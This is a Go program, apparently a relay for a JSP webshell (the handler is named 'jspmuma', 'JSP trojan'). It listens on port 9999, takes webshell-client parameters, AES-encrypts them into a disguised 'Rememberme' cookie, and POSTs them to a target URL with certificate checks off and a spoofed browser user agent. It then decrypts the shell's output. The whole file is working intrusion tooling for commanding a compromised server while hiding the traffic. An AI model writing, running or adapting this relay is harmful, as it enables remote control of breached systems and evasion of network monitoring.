package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var cmd5 string

func main() {

	fmt.Println("开始监听9999端口")
	http.HandleFunc("/", jspmuma)
	err := http.ListenAndServe(":9999", nil)

	if err != nil {
		//fmt.Println(err.Error())
	}
}

func jspmuma(w http.ResponseWriter, r *http.Request) {

	r.ParseForm()

	url := r.Form.Get("url")
	fmt.Println(url)
	//cookie := r.Form.Get("cookie")
	if url == "" {
		w.Write([]byte(">||<"))
		return
	}
	Z := r.Form.Get("023")
	z0 := r.Form.Get("z0")
	z1 := r.Form.Get("z1")
	z2 := r.Form.Get("z2")
	data := fmt.Sprintf("%s<||>%s<||>%s<||> %s", Z, z0, z1, z2)
	cmd5 = getmd5()

	result, err := AesEncrypt([]byte(data), []byte(cmd5))
	if err != nil {
		w.Write([]byte(">|" + err.Error() + "|<"))
		return
	}
	endata := base64.StdEncoding.EncodeToString(result)
	fmt.Println(cmd5, endata, data)
	rr := strings.NewReplacer("=", "%3D", "+", "%2B")
	endata = rr.Replace(endata)

	cookies := fmt.Sprintf(`Rememberme=%s; t=%s`, endata, cmd5)
	fmt.Println(cookies)
	fmt.Println("-----------------------")
	resp, err := HttpPost(url, "", cookies)
	if err != nil {
		w.Write([]byte(">|" + err.Error() + "|<"))
		return
	}

	fmt.Println(TrimString(resp))
	fmt.Println("-----------------------")

	decodeBytes, err := base64.StdEncoding.DecodeString(TrimString(resp))
	if err != nil {
		w.Write([]byte(TrimString(resp)))
		return
	}
	origData, err := AesDecrypt(decodeBytes, []byte(cmd5))
	if err != nil {
		w.Write([]byte(">|" + err.Error() + "|<"))
		return
	}

	w.Header().Add("Content-Type", "text/html;charset=utf-8")
	fmt.Fprintf(w, string(origData))
	return
}

func TrimString(str string) string {
	var str_buf []byte
	aa := []byte(str)
	for _, v := range aa {
		if v > 31 && v < 127 {
			str_buf = append(str_buf, v)
		}
	}
	return strings.TrimSpace(string(str_buf))
}

func HttpPost(url string, para string, cookie string) (string, error) {
	client := &http.Client{}
	client.Timeout = time.Second * 10
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client.Transport = tr
	req, err := http.NewRequest("POST", url, strings.NewReader(para))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0E; .NET4.0C)")
	req.Header.Set("Referer", url)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cookie", cookie)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != 200 {
		return "", errors.New("status 不为200")
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func getmd5() string {
	crutime := time.Now().Unix()
	h := md5.New()
	io.WriteString(h, strconv.FormatInt(crutime, 10))
	token := fmt.Sprintf("%x", h.Sum(nil))
	//return "sfe023f_9fd1fwfl"
	return token[0:16]
}

func AesEncrypt(origData, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = PKCS5Padding(origData, blockSize)
	// origData = ZeroPadding(origData, block.BlockSize())
	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])
	crypted := make([]byte, len(origData))
	// 根据CryptBlocks方法的说明，如下方式初始化crypted也可以
	// crypted := origData
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

func AesDecrypt(crypted, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])
	origData := make([]byte, len(crypted))
	// origData := crypted
	blockMode.CryptBlocks(origData, crypted)
	origData = PKCS5UnPadding(origData)
	// origData = ZeroUnPadding(origData)
	return origData, nil
}

func ZeroPadding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{0}, padding)
	return append(ciphertext, padtext...)
}

func ZeroUnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	// 去掉最后一个字节 unpadding 次
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
